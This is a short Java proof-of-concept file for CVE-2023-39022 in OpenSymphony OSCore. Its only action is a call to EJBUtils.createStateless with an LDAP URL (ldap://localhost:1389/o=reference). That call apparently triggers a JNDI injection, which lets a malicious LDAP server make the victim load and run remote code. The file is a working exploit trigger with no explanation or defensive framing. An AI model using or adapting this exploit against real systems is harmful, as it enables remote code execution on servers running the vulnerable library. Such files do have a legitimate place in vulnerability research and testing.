package com.anonuser;

import com.opensymphony.util.EJBUtils;

public class Oscore_CVE_2023_39022 {

    public static void main(String[] args) {
        try {
            EJBUtils.createStateless("ldap://localhost:1389/o=reference");
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}
